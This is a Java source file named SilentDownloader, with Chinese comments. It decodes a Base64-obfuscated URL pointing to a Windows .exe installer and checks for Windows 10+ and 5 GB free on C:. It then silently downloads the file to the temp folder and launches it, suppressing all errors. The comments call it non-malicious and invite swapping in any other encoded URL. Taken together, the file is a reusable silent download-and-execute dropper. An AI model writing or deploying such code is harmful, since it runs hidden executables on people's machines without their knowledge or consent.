package com.mtxgdn;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.util.Base64;

/**
 * 后台静默下载程序（无恶意）
 * 从变量读取Base64编码并解码 → 检查C盘≥5GB且系统为Windows 10+ → 异步下载至%temp%并打开
 */
public class SilentDownloader {

    // 若需替换，请将目标 URL 进行 Base64 编码后赋值于此
    private static final String ENCODED_URL = "aHR0cHM6Ly9hdXRvcGF0Y2hjbi55dWFuc2hlbi5jb20vY2xpZW50X2FwcC9kb3dubG9hZC9sYXVuY2hlci8yMDI2MDMwMjExNDIyOV8xNndkZUhCeVFxeGFYY1hGL3BjYmFja3VwMzE5L3l1YW5zaGVuX3NldHVwXzIwMjYwMzAyLmV4ZQ==";

    public static void main(String[] args) {
        // 1. 解码得到真实下载地址
        String downloadUrl;
        try {
            byte[] decodedBytes = Base64.getDecoder().decode(ENCODED_URL);
            downloadUrl = new String(decodedBytes);
        } catch (IllegalArgumentException e) {
            // Base64 解码失败，静默退出
            return;
        }

        // 2. 环境检查：Windows 10 及以上
        if (!isWindows10OrAbove()) {
            return;
        }

        // 3. 环境检查：C 盘剩余空间 ≥ 5 GB
        if (!hasEnoughSpaceOnC()) {
            return;
        }

        // 4. 启动异步下载器（新线程，避免阻塞主线程，JVM 会等待该线程结束）
        new Thread(() -> downloadAndOpen(downloadUrl)).start();
    }

    /**
     * 判断当前操作系统是否为 Windows 10 或更高版本
     */
    private static boolean isWindows10OrAbove() {
        String osName = System.getProperty("os.name");
        if (osName == null || !osName.toLowerCase().startsWith("windows")) {
            return false;
        }
        String osVersion = System.getProperty("os.version");
        if (osVersion == null) {
            return false;
        }
        // Windows 10/11 版本号均以 "10." 开头
        return osVersion.startsWith("10.");
    }

    /**
     * 检查 C 盘可用空间是否 ≥ 5 GB
     */
    private static boolean hasEnoughSpaceOnC() {
        File cDrive = new File("C:/");
        if (!cDrive.exists() || !cDrive.canRead()) {
            return false;
        }
        long freeSpace = cDrive.getUsableSpace(); // 字节
        long required = 5L * 1024L * 1024L * 1024L; // 5 GB
        return freeSpace >= required;
    }

    /**
     * 异步下载文件到系统临时目录，下载完成后尝试打开
     */
    private static void downloadAndOpen(String urlString) {
        HttpURLConnection connection = null;
        try {
            // 准备目标文件（位于 %temp% 目录，文件名从 URL 中提取）
            URL url = URI.create(urlString).toURL();
            String fileName = extractFileName(url);
            File tempDir = new File(System.getProperty("java.io.tmpdir"));
            File outputFile = new File(tempDir, fileName);

            // 防止重名，添加随机后缀（可选，避免覆盖已有文件）
            if (outputFile.exists()) {
                String baseName = fileName;
                String extension = "";
                int dotIndex = fileName.lastIndexOf('.');
                if (dotIndex > 0) {
                    baseName = fileName.substring(0, dotIndex);
                    extension = fileName.substring(dotIndex);
                }
                outputFile = new File(tempDir, baseName + "_" + System.currentTimeMillis() + extension);
            }

            // 建立 HTTP 连接并下载
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(30000);
            connection.setInstanceFollowRedirects(true); // 自动跟随重定向
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                try (InputStream in = connection.getInputStream();
                     FileOutputStream out = new FileOutputStream(outputFile)) {
                    byte[] buffer = new byte[8192];
                    int len;
                    while ((len = in.read(buffer)) != -1) {
                        out.write(buffer, 0, len);
                    }
                }
                // 下载完成，打开文件（默认关联程序）
                openFile(outputFile);
            }
        } catch (Exception e) {
            // 静默失败，不输出任何信息（完全后台运行）
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    /**
     * 从 URL 中提取文件名（带扩展名），若无法提取则使用默认名
     */
    private static String extractFileName(URL url) {
        String path = url.getPath();
        if (path == null || path.isEmpty() || path.endsWith("/")) {
            return "downloaded_file";
        }
        String fileName = path.substring(path.lastIndexOf('/') + 1);
        if (fileName.isEmpty()) {
            fileName = "downloaded_file";
        }
        return fileName;
    }

    /**
     * 打开文件（使用系统默认关联程序）
     */
    private static void openFile(File file) {
        if (file == null || !file.exists()) {
            return;
        }
        try {
            // 优先使用 Desktop API（适用于图形界面环境）
            if (java.awt.Desktop.isDesktopSupported()) {
                java.awt.Desktop desktop = java.awt.Desktop.getDesktop();
                if (desktop.isSupported(java.awt.Desktop.Action.OPEN)) {
                    desktop.open(file);
                    return;
                }
            }
            // 降级方案：Windows 专属命令行打开
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("windows")) {
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "start", "", file.getAbsolutePath()});
            }
        } catch (Exception e) {
            // 打开失败也静默处理
        }
    }


}